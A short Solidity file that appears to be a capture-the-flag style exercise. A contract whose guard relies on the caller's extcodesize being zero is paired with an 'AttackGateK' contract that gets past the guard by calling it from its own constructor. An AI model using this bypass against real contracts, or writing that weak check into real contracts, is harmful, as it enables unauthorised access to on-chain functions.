// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Mod2 {
    bool public enter = false;

    modifier gateTwo() {
        uint x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }
    function enterin() public gateTwo returns (bool) {
        enter = true;
        return true;
    }
}
contract AttackGateK {
    Mod2 public gateK;

    constructor(address _gateK) {
        gateK = Mod2(_gateK);
        gateK.enterin();
    }

}

